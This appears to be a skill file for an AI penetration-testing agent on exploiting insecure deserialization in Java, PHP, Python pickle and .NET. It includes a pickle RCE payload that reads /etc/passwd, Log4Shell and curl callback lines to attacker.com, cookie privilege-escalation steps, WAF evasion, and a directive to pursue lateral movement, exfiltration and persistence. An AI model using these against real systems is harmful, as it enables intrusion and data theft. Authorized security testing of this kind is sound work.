---
name: deserialization
description: "Insecure deserialization exploitation across Java, PHP, Python, and .NET with gadget chain techniques"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["deserialization vulnerability", "insecure deserialization", "java deserialization", "php deserialization", "python pickle", "dotnet deserialization", "gadget chain", "object injection", "serializes attack", "unserialize vulnerability"]
contextBoosts: [api]
mitreAttack: ["T1190", "T1059"]
owaspRefs: ["OWASP Top 10 A08:2021 Software and Data Integrity Failures"]
---

# Deserialization Attack Skill

## When to Use

- Target accepts serialized objects (cookies, API bodies, file uploads, session tokens)
- Application uses Java `ObjectInputStream`, PHP `unserialize()`, Python `pickle.loads()`, or .NET `BinaryFormatter`
- Serialized data travels over the network (cookies, POST bodies, headers, tokens)
- You observe Base64-encoded blobs in cookies or parameters that decode to binary structures
- WAF or input validation appears to inspect plaintext but not decoded payloads
- The application deserializes user-controlled data without integrity checks (no HMAC, no signature)

## Do Not Use

- Target has no serialized data surfaces visible in traffic
- Application uses safe serialization formats (JSON, YAML without custom constructors, Protocol Buffers without user type resolution)
- Deserialized data is signed and verified with a key you cannot derive or guess
- You are testing a system where deserialization is handled by a hardened library with allowlists
- You lack sufficient context about the target's classpath, runtime, or framework version

## Auth Context

- Deserialization flaws are often behind authentication (session cookies, profile objects, tokens)
- Capture authenticated traffic first: login, perform actions that touch serialized surfaces
- Check for serialized data in session cookies, CSRF tokens with embedded state, or "remember me" tokens
- Some apps expose deserialization endpoints only to authenticated users (admin imports, report generators)
- Note the authentication boundary: unauthenticated deserialization is Critical, authenticated is High

## Detection

### Identify Serialized Data Surfaces

**Cookie Inspection:**
- Look for cookies with Base64-encoded values that decode to binary markers
- Java serialized data starts with `0xAC 0xED` (Base64: `rO0AB`)
- PHP serialized data starts with `O:` (object), `a:` (array), `s:` (string), `i:` (integer)
- Python pickle starts with `0x80 0x04` (protocol 4) or `0x80 0x02` (protocol 2)
- .NET `BinaryFormatter` produces Base64 blobs with type metadata containing `$` or assembly names

**Parameter and Body Analysis:**
- POST bodies with `application/x-java-serialized-object` content type
- Parameters containing `java.util.HashMap` or `com.example.UserClass` references
- JSON fields that reference PHP class names (e.g., `{"__php_class": "App\\User"}`)
- API endpoints that accept `application/octet-stream` with class metadata

**HTTP Header Patterns:**
- `Cookie: session=<base64-blob>` where blob decodes to Java/PHP/Python markers
- `Authorization: Bearer <blob>` where blob contains serialized type information
- Custom headers like `X-Object-State` or `X-Session-Data`

**Traffic Replay Indicators:**
- Replaying a request with modified serialized data changes server behavior
- Changing a field in the serialized blob (role, price, user ID) alters authorization
- Server errors with class-not-found or deserialization exceptions

### Detection Heuristics

1. Modify one byte in a Base64 cookie value — if server returns `ClassNotFoundException` or `unserialize()` warning, deserialization is confirmed
2. Inject a known benign class — if the server processes it, deserialization is happening
3. Check error pages for stack traces containing `ObjectInputStream.readObject()` or `unserialize()`
4. Use timing: serialized objects that trigger RCE gadgets often have measurable response time differences

## Java Deserialization

### ysoserial Framework

ysoserial generates serialized payloads for known Java library gadget chains. The core technique:

1. Identify the target's classpath (framework version, libraries in `WEB-INF/lib/` or `META-INF/maven/`)
2. Select the appropriate gadget chain based on available libraries
3. Generate the payload: `java -jar ysoserial.jar <chain> <command>`
4. Encode the payload (Base64, URL-encode, or raw bytes) and inject into the serialized surface
5. Trigger deserialization by sending the modified request

### Commons Collections Gadgets

The Commons Collections library is the most common target because it ships with many Java frameworks:

- **CommonsCollections1**: Uses `InvokerTransformer` and `ChainedTransformer` to achieve RCE via `Runtime.exec()`. Requires Commons Collections ≤ 3.2.1 (pre-serial filter)
- **CommonsCollections2**: Uses `PriorityQueue` and `TransformingComparator` for Collections 4.0 gadget chains
- **CommonsCollections3/4**: Variants targeting different versions of Commons Collections with alternative entry points
- **CommonsCollections5/6/7**: Extended chains for environments where standard chains are filtered

Selection criteria:
- Check Commons Collections version from `pom.xml`, Maven metadata, or library JAR names in responses
- If version ≤ 3.2.1: CommonsCollections1 or 3
- If version 4.0+: CommonsCollections2, 5, 6, or 7
- If no Commons Collections: look for Spring, Hibernate, or other library gadgets

### JNDI Injection and Log4Shell Context

JNDI injection is a deserialization-adjacent technique where the payload triggers a JNDI lookup:

- **Log4Shell (CVE-2021-44228)**: Exploits JNDI lookup in Log4j `lookup` patterns — `${jndi:ldap://attacker.com/payload}`
- The JNDI lookup connects to an attacker-controlled LDAP/RMI server that serves a malicious Java class
- The malicious class executes arbitrary code when loaded by the victim JVM
- Mitigations: `com.sun.jndi.ldap.object.trustURLCodebase=false` (Java 8u191+), but bypasses exist

**Deserialization + JNDI chains:**
- Some gadget chains (e.g., Commons Collections with `JndiLookup`) combine deserialization with JNDI
- The serialized object triggers a JNDI lookup that loads an attacker-controlled class
- This bypasses classpath-based gadget restrictions

### Java Deserialization Testing Flow

1. **Map classpath**: Identify framework, library versions from error messages, response headers, file paths
2. **Generate payload**: Use ysoserial with the correct gadget chain
3. **Encode**: Base64 for cookies, URL-encoding for parameters, raw bytes for binary uploads
4. **Inject**: Place the payload in a deserialization surface (cookie, POST body, header)
5. **Verify**: Check for RCE indicators (DNS callback, file write, command output in response)
6. **Escalate**: If RCE confirmed, attempt lateral movement, data exfiltration, persistence

## PHP Deserialization

### unserialize() Attack Surface

PHP's `unserialize()` function reconstructs objects from serialized strings. When user input reaches `unserialize()`, the attacker controls which class is instantiated and what data is passed to it.

**Magic Method Triggers:**
- `__wakeup()`: Called when an object is unserialized — often used for initialization, but exploitable if it performs privileged actions
- `__destruct()`: Called when an object is destroyed — if it has a `__destruct()` that writes to a file or executes code, it triggers automatically
- `__toString()`: Called when the object is used as a string — chains with other methods
- `__call()`: Called when invoking an undefined method — useful for gadget chain redirection

### POP Chains (Property-Oriented Programming)

POP chains chain together PHP magic methods to achieve code execution:

1. **Entry point**: A class with `__wakeup()` or `__destruct()` that calls a method on one of its properties
2. **Chain link**: The property's class has a `__toString()` or `__call()` that calls another method
3. **Sink**: The final class in the chain performs the dangerous operation (file write, `eval()`, `system()`)

**Example chain structure:**
- Class A (`__destruct`) → calls `$this->log->write($this->data)`
- Class B (`__call`) → calls `eval($method)` or writes to file
- Control `$this->log` and `$this->data` via serialized properties

### PHP Deserialization Testing

1. **Identify**: Find `unserialize()` calls in decompiled code or error messages that reference custom classes
2. **Map classes**: Identify available classes with magic methods from autoloading paths or error messages
3. **Build chain**: Connect entry point magic methods to a dangerous sink
4. **Craft payload**: Construct serialized string: `O:8:"ClassName":2:{s:4:"prop1";s:5:"value";s:4:"prop2";O:9:"LinkClass":1:{...}}`
5. **Encode**: URL-encode, Base64, or place directly in the parameter
6. **Verify**: Confirm code execution via DNS callback, file write, or command output

### PHP Object Injection Patterns

- PHP 7.0+ introduced `allowed_classes` option in `unserialize()` — if `false` is passed, only built-in classes are allowed
- If `allowed_classes` is not set or is `true`, all classes are available for instantiation
- `__unserialize()` (PHP 7.4+) replaces `__wakeup()` and may have different behavior — check both
- `Serializable` interface (deprecated) provides custom serialization — may have different attack surface

## Python Pickle

### pickle.loads() Vulnerability

Python's `pickle` module deserializes arbitrary Python objects. When `pickle.loads()` processes user-controlled data, it executes arbitrary code:

- The `__reduce__` method on a class defines how to reconstruct the object
- By defining `__reduce__` to return `(os.system, ('command',))`, the attacker achieves RCE
- Pickle payloads start with `\x80\x04` (protocol 4) or `\x80\x02` (protocol 2)

### RCE Payload Construction

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id; whoami; cat /etc/passwd',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```

The payload, when unpickled, calls `os.system()` with the specified command.

### Pickle Deserialization Testing

1. **Identify**: Look for `pickle.loads()`, `pickle.load()`, `cPickle.loads()`, or `shelve.open()` with user input
2. **Encode**: Base64-encode the pickle payload for transport in cookies or parameters
3. **Inject**: Place the Base64 payload in the deserialization surface
4. **Verify**: Confirm code execution via DNS callback (e.g., `curl http://attacker.com/$(whoami)`) or file write
5. **Note**: Python pickle deserialization is almost always RCE — no gadget chain complexity needed

### Pickle Variants

- `cPickle`: C implementation, same vulnerability, different module name
- `shelve`: Uses pickle under the hood — `shelve.open()` with user-controlled keys is exploitable
- `dill`: Extends pickle with more object types — same vulnerabilities apply
- `jsonpickle`: Serializes to JSON, but can deserialize arbitrary Python objects if `unpicklable=True`

## .NET Deserialization

### BinaryFormatter

`BinaryFormatter` is the most dangerous .NET deserializer — it deserializes arbitrary types and is the root cause of most .NET deserialization vulnerabilities:

- Serializes type metadata including assembly names and type names
- Deserialization reconstructs the full object graph, triggering constructors, `OnDeserializing`, and `IDeserializationCallback`
- RCE is achievable via gadgets like `TypeConfuseDelegate`, `PSObject`, or `ObjectDataProvider`

### ObjectStateFormatter and LosFormatter

- `ObjectStateFormatter`: Used in ASP.NET ViewState serialization — if ViewState is not MAC-protected, it can be tampered with
- `LosFormatter`: A wrapper around `ObjectStateFormatter` that handles Base64 encoding — same vulnerabilities
- Both use `BinaryFormatter` internally for type resolution

### TypeConfuseDelegate

The `TypeConfuseDelegate` gadget exploits `Comparer` and type confusion:

1. A `SortedSet` with a `Comparer` that references a delegate
2. The delegate points to a method that performs code execution
3. During deserialization, the `Comparer` is invoked, triggering the gadget chain

### .NET Deserialization Testing

1. **Identify**: Look for `BinaryFormatter.Deserialize()`, `ObjectStateFormatter.Deserialize()`, `LosFormatter.Deserialize()`, or `JsonConvert.DeserializeObject<T>()` with `TypeNameHandling.All`
2. **Check protections**: Is ViewState MAC-protected? Is `TypeNameHandling` restricted? Are there `SerializationBinder` allowlists?
3. **Generate payload**: Use tools like `ysoserial.net` for .NET gadget chains
4. **Encode**: Base64 for ViewState, raw bytes for binary uploads, JSON with `$type` for JSON deserialization
5. **Verify**: Confirm RCE via DNS callback or command output

### .NET JSON Deserialization (TypeNameHandling)

When `JsonConvert.DeserializeObject<T>()` is used with `TypeNameHandling.All` or `TypeNameHandling.Auto`:

- The JSON payload can include `$type` metadata specifying the class to instantiate
- This enables object injection similar to Java/PHP deserialization
- Gadgets include `ObjectDataProvider`, `WindowsIdentity`, `XamlReader`, and `DataSet`/`DataTable`
- .NET 8+ introduced `JsonSerializer` with source generators — safer but not immune if misconfigured

## Cookie-based Deserialization

### Session Cookie Manipulation

1. **Capture**: Record the serialized session cookie from an authenticated request
2. **Decode**: Base64-decode the cookie to reveal the serialized object
3. **Analyze**: Identify the class name, fields, and their values (user ID, role, expiry)
4. **Modify**: Change privileged fields (role: "admin", user ID: 1, expiry: far future)
5. **Re-encode**: Base64-encode the modified serialized data
6. **Replace**: Set the modified cookie in the request and resubmit
7. **Verify**: Confirm the privilege change (access admin panel, modify other users' data)

### Common Cookie Patterns

- **Java**: Base64-encoded `rO0AB` prefix — modify the `HashMap` fields containing user attributes
- **PHP**: Plain-text serialization `O:4:"User":3:{...}` — modify the role or ID property
- **Python**: Base64-encoded pickle — rebuild the payload with `__reduce__` for RCE
- **.NET**: Base64-encoded `BinaryFormatter` output — inject gadget chain payload

## Filter Bypass

### Encoding Bypass

- **Double Base64**: Encode the serialized payload twice — the application may decode once, then `unserialize()` the result
- **URL encoding**: URL-encode special characters in the serialized string — bypasses simple pattern matching
- **Gzip + Base64**: Compress the payload before Base64 encoding — some applications decompress before deserializing
- **Hex encoding**: Encode the payload as hex strings — bypasses WAF rules that scan for binary patterns
- **Unicode encoding**: Use Unicode escape sequences for characters that trigger WAF rules

### Format Wrapping

- **XML wrapping**: Wrap the serialized payload in an XML CDATA section — bypasses content-type inspection
- **JSON wrapping**: Embed the serialized payload in a JSON field — some parsers deserialize the JSON value
- **Multipart boundary**: Place the serialized payload in a multipart form field with a custom content type
- **Nested deserialization**: Use one deserialization format to trigger another (e.g., XML XXE → file read → deserialization)

### WAF Evasion

- Split the serialized payload across multiple parameters — reassemble on the server side
- Use chunked transfer encoding to break the payload across TCP segments
- Insert null bytes or whitespace into class names (Java serialization tolerates this in some implementations)
- Modify the serialization protocol version byte — some deserializers accept multiple versions

## Anti-Hallucination

### Verification Rules

1. **Do not claim exploitation without proof** — you must show the actual server response, DNS callback, or file modification
2. **Do not assume gadget chain availability** — verify library versions from error messages, response headers, or classpath disclosure
3. **Do not claim "deserialization vulnerability" without evidence** — you must demonstrate that user-controlled data reaches a deserialization function
4. **Do not fabricate Base64-decoded content** — decode the actual cookie or parameter value and show the real structure
5. **Do not assume RCE from object injection alone** — object injection may only cause logic bugs; RCE requires a specific gadget chain
6. **Verify magic method triggers** — do not claim `__wakeup()` or `__destruct()` exploitation without showing the method exists and performs the claimed action
7. **Confirm the deserialization sink exists** — grep the source for `unserialize()`, `pickle.loads()`, `BinaryFormatter.Deserialize()`, or `ObjectInputStream.readObject()` before claiming vulnerability
8. **Do not confuse serialization formats** — a Base64 string is not automatically a serialized object; decode and verify the binary markers before proceeding

### Evidence Requirements

- Capture the original serialized data (cookie, parameter, body)
- Show the decoded structure (hex dump or parsed fields)
- Document the modification made (what field was changed, what gadget was injected)
- Record the server response proving exploitation (command output, DNS callback log, error message confirming class instantiation)
- If testing is inconclusive, report as "potential" with the evidence that supports further investigation
